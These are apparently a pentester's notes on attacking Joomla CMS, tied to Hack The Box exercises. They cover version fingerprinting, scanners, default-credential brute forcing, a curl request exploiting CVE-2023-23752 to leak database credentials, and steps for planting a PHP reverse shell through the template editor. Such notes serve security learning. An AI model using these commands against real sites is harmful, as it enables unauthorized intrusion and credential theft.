# Joomla CMS

[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)

<div class="row row-cols-lg-2"><div>

[Joomla](https://www.joomla.org/) is an open-source Content Management System (CMS) written in PHP. The version 5 is currently in development (2024).

* [GitHub](https://github.com/joomla/joomla-cms) <small>(4.9k ⭐)</small>
* [Documentation](https://docs.joomla.org/) <small>(⛪)</small>

You can see the repartition of active Joomla installations [here](https://developer.joomla.org/stats/cms_version).
</div><div>

The admin panel default URI is: `/administrator`.
</div></div>

<hr class="sep-both">

## Joomla Pentester Notes ☠️

[![attacking_common_applications](../../../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
[![devvortex](../../../../../cybersecurity/_badges/htb-p/devvortex.svg)](https://app.hackthebox.com/machines/Devvortex)

<div class="row row-cols-lg-2"><div>

The `/robots.txt` file may contain the list of interesting paths. If the website was not properly configured, `/README.txt` may be accessible. It's also possible that there is a tag `<meta name="generator" ...>`.

It some versions, we may be able to access `/administrator/manifests/files/joomla.xml`, `/media/system/js/`, or `/plugins/system/cache/cache.xml` <small>(rather unreliable and outdated)</small> to find the version.

```ps
$ curl [...].xml | xmllint --format -
```

* OWASP initiated the development of [joomscan](https://github.com/OWASP/joomscan) <small>(1.1k ⭐)</small>

```ps
$ sudo apt install joomscan
$ joomscan -u URL
[+] Detecting Joomla Version
[++] Joomla x.y.z

<SNIP... Nothing of interest>
```

* You can try to use [droopescan](/cybersecurity/red-team/tools/scanners/web/droopescan.md) <small>(not really useful)</small>

```ps
$ droopescan scan joomla --url URL
<SNIP... Nothing of interest>
```

* You can try to use [JoomlaScan](https://github.com/drego85/JoomlaScan) <small>(0.2k ⭐, 2022 🪦)</small>
</div><div>

* Default username: `admin`. Password set at install time. You can test default credentials using [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce) <small>(0.1k ⭐, 2020 🪦)</small> while you should not use it for brute force <small>(it sucks...)</small>.

```shell!
$ wget https://github.com/ajnik/joomla-bruteforce/raw/master/joomla-brute.py
$ cp /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt .
$ python joomla-brute.py -u URL -w http_default_pass.txt --username admin -v
```

* [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752): Exposed credentials `[4.0.0, 4.2.7]`. See also: [PoC (ruby)](https://github.com/Acceis/exploit-CVE-2023-23752) <small>(0.1k ⭐)</small> or manual exploitation:

```ps
$ curl -v URL/api/index.php/v1/config/application?public=true
"dbtype": "mysqli",
"host": "localhost",
"user": "xxx",
"password": "yyy"
"db": "joomla",
```

* When logged as administrator, you can upload a [reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md):

In Joomla 3, Navigate to `Configuration > Templates > Templates`. In Joomla 4, navigate to `System > Site Templates`. Select a template.
Create a new file or upload one if you can. You can copy-paste a shell:

```ps
$ cat revshell.php | xclip -selection clipboard
```

The file path is shown in the editor, while, for reference, mine was at the URL:  `URL/templates/<your_selected_site_name>/revshell.php`.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `/images`, `/home`, `/media`, `/templates`, `/modules`
* `/plugins`, `/includes`, `/language`, `/components`, `/api`
* `/cache`, `/libraries`, `/tmp`, `/layouts`, `/administrator`
* `/media/templates/site/<name>/assets/`
</div><div>
</div></div>